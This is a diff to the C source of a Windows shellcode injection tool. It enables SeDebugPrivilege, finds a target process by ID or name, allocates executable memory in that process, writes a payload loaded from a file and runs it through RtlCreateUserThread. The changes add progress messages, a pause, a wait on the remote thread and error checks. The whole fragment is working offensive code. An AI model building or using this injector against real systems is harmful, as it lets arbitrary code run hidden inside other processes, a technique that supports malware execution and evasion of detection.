@@ -152,15 +152,20 @@ BOOL injectPIC(DWORD id, LPVOID code, DWORD codeLen) {
     cs=VirtualAllocEx(hp, NULL, codeLen, 
       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
+    printf("  [ writing code to %p.\n", cs);
     // 4. copy the payload to remote memory
     WriteProcessMemory(hp, cs, code, codeLen, &wr); 
-      
+    printf("  [ press any key to continue.\n");
+    getchar();
+    
     // 5. execute payload in remote process
     printf("  [ creating new thread.\n");
     nt = pRtlCreateUserThread(hp, NULL, FALSE, 0, NULL, 
       NULL, cs, NULL, &ht, &cid);
     
     printf("  [ nt status is %lx\n", nt);
+    WaitForSingleObject(ht, INFINITE);
+    
     // 6. close remote thread handle
     CloseHandle(ht);
     
@@ -199,21 +204,28 @@ int main(int argc, char *argv[]){
     DWORD  pid;
 
     if (argc != 3){
-      printf("\nusage: inject <process id | process name> <payload.bin>\n");
+      printf("\n  [ usage: inject <process id | process name> <payload.bin>\n");
       return 0;
     }
     
     if(!EnablePrivilege(SE_DEBUG_NAME)) {
-      printf("cannot enable SeDebugPrivilege.\n");
+      printf("  [ cannot enable SeDebugPrivilege.\n");
     }
     
     // get pid
     pid=atoi(argv[1]);
     if(pid==0) pid=name2pid(argv[1]);
     
+    if(pid==0) {
+      printf("  [ unable to obtain process id.\n");
+      return 0;
+    }
     // pic
     code_len = getdata(argv[2], &code);
-      
+    if(code_len == 0) {
+      printf("  [ unable to read payload.\n");
+      return 0;
+    }
     injectPIC(pid, code, code_len);
     free(code);
     return 0;
